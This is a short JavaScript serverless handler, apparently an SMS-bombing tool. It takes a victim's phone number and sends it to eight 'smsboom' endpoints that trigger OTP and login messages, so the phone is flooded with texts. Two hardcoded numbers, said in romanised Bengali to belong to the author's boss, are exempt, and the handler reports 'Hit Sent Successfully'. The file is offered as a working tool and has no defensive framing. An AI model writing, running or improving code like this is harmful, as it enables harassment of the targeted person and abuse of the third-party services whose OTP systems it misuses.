export default async function handler(req, res) {
  const { number } = req.query;

  if (!number) {
    return res.status(400).json({ error: "number required" });
  }

  // 🚫 Blocked numbers
  const BLOCKED_NUMBERS = [
    "01760432796",
    "01660832796"
  ];

  // যদি blocked number হয়
  if (BLOCKED_NUMBERS.includes(number)) {
    return res.status(403).json({
      ok: false,
      message: "aii ta amr boss aii ta te kora somvob nah"
    });
  }

  // 🔽 API list
  const APIS = [
    "https://smsboom.vercel.app/send-otp",
    "https://smsbooma.vercel.app/verify-phone",
    "https://smsboomc.vercel.app/shikho-send-otp",
    "https://smsboomg.vercel.app/bondi-login",
    "https://smsboomi.vercel.app/bioscope-login",
    "https://smsboomj.vercel.app/send-otp",
    "https://smsboomk.vercel.app/send-otp",
    "https://smsboomm.vercel.app/send-otp"
  ];

  // সব API hit করবে
  for (const api of APIS) {
    try {
      await fetch(`${api}?number=${encodeURIComponent(number)}`);
    } catch (e) {
      // error ignore
    }
  }

  return res.json({
    ok: true,
    message: "Hit Sent Successfully"
  });
}